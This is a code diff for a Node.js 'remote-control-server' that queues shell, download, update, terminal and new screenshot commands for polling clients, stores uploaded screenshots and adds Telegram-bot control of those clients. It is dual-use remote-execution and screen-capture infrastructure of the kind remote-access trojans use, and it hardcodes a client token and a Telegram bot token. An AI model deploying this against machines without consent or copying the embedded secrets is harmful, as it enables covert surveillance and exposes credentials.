@@ -2,6 +2,7 @@ const crypto = require("crypto");
 const express = require("express");
 const fs = require("fs");
 const path = require("path");
+const { createTelegramBot } = require("./telegram-bot");
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -10,16 +11,29 @@ const FIXED_TOKEN = "a9K2xP8mZ7QwL1vB";
 const ONLINE_THRESHOLD_MS = 30 * 1000;
 const DATA_DIR = path.join(__dirname, "data");
 const LOGS_DIR = path.join(__dirname, "logs");
+const SCREENSHOTS_DIR = path.join(DATA_DIR, "screenshots");
 const STORAGE_PATH = path.join(DATA_DIR, "storage.json");
 const LOG_PATH = path.join(LOGS_DIR, "server.log");
 const PUBLIC_DIR = path.join(__dirname, "public");
+const APP_VERSION = "1.0.5";
+const TELEGRAM_BOT_TOKEN =
+  process.env.TELEGRAM_BOT_TOKEN ||
+  "8500323208:AAH_ugbRhSS4Pz-339m9S6WEm9j1JsMthms";
+const TELEGRAM_ALLOWED_CHAT_IDS = process.env.TELEGRAM_ALLOWED_CHAT_IDS || "";
+const TELEGRAM_PUBLIC_BASE_URL =
+  process.env.TELEGRAM_PUBLIC_BASE_URL ||
+  process.env.APP_BASE_URL ||
+  process.env.RENDER_EXTERNAL_URL ||
+  "https://client-status-server.onrender.com";
 
-app.use(express.json({ limit: "1mb" }));
+app.use(express.json({ limit: "12mb" }));
 app.use(express.static(PUBLIC_DIR, { index: false }));
+app.use("/screenshots", express.static(SCREENSHOTS_DIR, { index: false }));
 
 function ensureDirectories() {
   fs.mkdirSync(DATA_DIR, { recursive: true });
   fs.mkdirSync(LOGS_DIR, { recursive: true });
+  fs.mkdirSync(SCREENSHOTS_DIR, { recursive: true });
 
   if (!fs.existsSync(STORAGE_PATH)) {
     const initialState = {
@@ -120,7 +134,38 @@ function normalizeReportEntry(entry) {
     terminal_session_id: normalizeOptionalText(entry.terminal_session_id, 120),
     terminal_type: normalizeOptionalText(entry.terminal_type, 40),
     terminal_title: normalizeOptionalText(entry.terminal_title, 120),
-    display_command: normalizeOptionalText(entry.display_command, 1000)
+    display_command: normalizeOptionalText(entry.display_command, 1000),
+    screenshot_path: normalizeOptionalText(entry.screenshot_path, 260),
+    screenshot_mime_type: normalizeOptionalText(entry.screenshot_mime_type, 80)
+  };
+}
+
+function getScreenshotUrl(report) {
+  return report.screenshot_path ? `/screenshots/${encodeURIComponent(report.screenshot_path)}` : "";
+}
+
+function saveScreenshotDataUrl(dataUrl) {
+  const match = /^data:(image\/[a-zA-Z0-9.+-]+);base64,([\s\S]+)$/.exec(String(dataUrl || "").trim());
+  if (!match) {
+    return null;
+  }
+
+  const mimeType = match[1].toLowerCase();
+  const extension = mimeType.includes("png") ? "png" : mimeType.includes("jpeg") || mimeType.includes("jpg") ? "jpg" : "";
+  if (!extension) {
+    return null;
+  }
+
+  const buffer = Buffer.from(match[2], "base64");
+  if (!buffer.length) {
+    return null;
+  }
+
+  const filename = `${Date.now()}-${crypto.randomUUID()}.${extension}`;
+  fs.writeFileSync(path.join(SCREENSHOTS_DIR, filename), buffer);
+  return {
+    filename,
+    mime_type: mimeType
   };
 }
 
@@ -231,7 +276,8 @@ function isSupportedCommand(command) {
     command.startsWith("download:") ||
     command.startsWith("update:") ||
     command.startsWith("terminal_exec:") ||
-    command.startsWith("terminal_close:")
+    command.startsWith("terminal_close:") ||
+    command === "screenshot"
   );
 }
 
@@ -294,6 +340,94 @@ function queueCommandForClient(storage, clientId, command, metadata = {}) {
   return commandEntry;
 }
 
+function mutateStorage(mutator) {
+  const storage = readStorage();
+  const result = mutator(storage);
+  writeStorage(storage);
+  return result;
+}
+
+function requireStoredClient(storage, clientId) {
+  const client = storage.clients[clientId];
+  if (!client) {
+    throw new Error("Client is not registered");
+  }
+
+  return client;
+}
+
+function queueDashboardCommand(clientId, command, metadata = {}, source = "telegram") {
+  if (!isSupportedCommand(command)) {
+    throw new Error("Unsupported command format");
+  }
+
+  const commandEntry = mutateStorage((storage) => {
+    requireStoredClient(storage, clientId);
+    return queueCommandForClient(storage, clientId, command, metadata);
+  });
+
+  logAction(`${source}_command_added`, {
+    client_id: clientId,
+    command_id: commandEntry.command_id,
+    command_kind: commandEntry.command_kind,
+    command_preview: command.slice(0, 120)
+  });
+
+  return commandEntry;
+}
+
+function renameStoredClient(clientId, name, source = "telegram") {
+  const normalizedName = normalizeOptionalText(name, 120);
+  if (!normalizedName) {
+    throw new Error("Client name cannot be empty");
+  }
+
+  mutateStorage((storage) => {
+    const client = requireStoredClient(storage, clientId);
+    client.name = normalizedName;
+  });
+
+  logAction(`${source}_client_renamed`, {
+    client_id: clientId,
+    name: normalizedName
+  });
+
+  return normalizedName;
+}
+
+function setStoredClientArchived(clientId, archived, source = "telegram") {
+  if (typeof archived !== "boolean") {
+    throw new Error("archived must be a boolean");
+  }
+
+  mutateStorage((storage) => {
+    const client = requireStoredClient(storage, clientId);
+    client.archived = archived;
+  });
+
+  logAction(`${source}_client_archive_changed`, {
+    client_id: clientId,
+    archived
+  });
+
+  return archived;
+}
+
+function deleteStoredClient(clientId, source = "telegram") {
+  mutateStorage((storage) => {
+    requireStoredClient(storage, clientId);
+    delete storage.clients[clientId];
+    delete storage.commands[clientId];
+    storage.reports = storage.reports.filter((report) => report.client_id !== clientId);
+  });
+
+  logAction(`${source}_client_deleted`, {
+    client_id: clientId
+  });
+
+  return true;
+}
+
 function buildDashboardData(storage) {
   const clients = Object.values(storage.clients)
     .map((client) => {
@@ -310,6 +444,11 @@ function buildDashboardData(storage) {
         pending_commands: queue.length,
         queued_commands: queue,
         latest_report: latestReport
+          ? {
+              ...latestReport,
+              screenshot_url: getScreenshotUrl(latestReport)
+            }
+          : null
       };
     })
     .sort((left, right) => {
@@ -329,7 +468,8 @@ function buildDashboardData(storage) {
       return {
         ...report,
         display_name: getClientDisplayName(client),
-        archived: Boolean(client.archived)
+        archived: Boolean(client.archived),
+        screenshot_url: getScreenshotUrl(report)
       };
     });
 
@@ -349,8 +489,10 @@ function buildDashboardData(storage) {
 
 app.get("/health", (_req, res) => {
   res.json({
+    version: APP_VERSION,
     service: "remote-control-server",
     status: "ok",
+    telegram_bot_enabled: Boolean(TELEGRAM_BOT_TOKEN),
     endpoints: [
       "GET /",
       "GET /health",
@@ -424,7 +566,7 @@ app.get("/get-command", clientAuthMiddleware, requireClientId, (req, res) => {
   });
 });
 
-app.post("/report", clientAuthMiddleware, requireClientId, requireTextField("result", 10000), (req, res) => {
+app.post("/report", clientAuthMiddleware, requireClientId, requireTextField("result", 20000), (req, res) => {
   const storage = readStorage();
   let client = storage.clients[req.clientId];
 
@@ -440,6 +582,10 @@ app.post("/report", clientAuthMiddleware, requireClientId, requireTextField("res
 
   client.last_seen_at = new Date().toISOString();
 
+  const screenshotAsset = req.body?.screenshot_data_url
+    ? saveScreenshotDataUrl(normalizeOptionalText(req.body?.screenshot_data_url, 11_000_000))
+    : null;
+
   const reportEntry = normalizeReportEntry({
     report_id: crypto.randomUUID(),
     client_id: req.clientId,
@@ -450,7 +596,9 @@ app.post("/report", clientAuthMiddleware, requireClientId, requireTextField("res
     terminal_session_id: req.body?.terminal_session_id,
     terminal_type: req.body?.terminal_type,
     terminal_title: req.body?.terminal_title,
-    display_command: req.body?.display_command
+    display_command: req.body?.display_command,
+    screenshot_path: screenshotAsset?.filename,
+    screenshot_mime_type: screenshotAsset?.mime_type
   });
 
   storage.reports.push(reportEntry);
@@ -486,7 +634,7 @@ app.post(
         command_preview: req.command.slice(0, 120)
       });
       return res.status(400).json({
-        error: "Unsupported command format. Use shell:, download:, update:, terminal_exec:, or terminal_close:"
+        error: "Unsupported command format. Use shell:, download:, update:, screenshot, terminal_exec:, or terminal_close:"
       });
     }
 
@@ -610,7 +758,31 @@ app.use((err, _req, res, _next) => {
   res.status(500).json({ error: "Internal server error" });
 });
 
+const telegramBot = createTelegramBot({
+  token: TELEGRAM_BOT_TOKEN,
+  publicBaseUrl: TELEGRAM_PUBLIC_BASE_URL,
+  allowedChatIds: TELEGRAM_ALLOWED_CHAT_IDS,
+  appVersion: APP_VERSION,
+  getDashboardData: () => buildDashboardData(readStorage()),
+  queueCommand: (clientId, command, metadata) => queueDashboardCommand(clientId, command, metadata, "telegram"),
+  renameClient: (clientId, name) => renameStoredClient(clientId, name, "telegram"),
+  setClientArchived: (clientId, archived) => setStoredClientArchived(clientId, archived, "telegram"),
+  deleteClient: (clientId) => deleteStoredClient(clientId, "telegram"),
+  queueRestart: (clientId) =>
+    queueDashboardCommand(
+      clientId,
+      "restart",
+      {
+        command_kind: "manual",
+        display_command: "restart"
+      },
+      "telegram"
+    ),
+  logAction
+});
+
 ensureDirectories();
 app.listen(PORT, HOST, () => {
   logAction("server_started", { host: HOST, port: PORT });
+  telegramBot.start();
 });
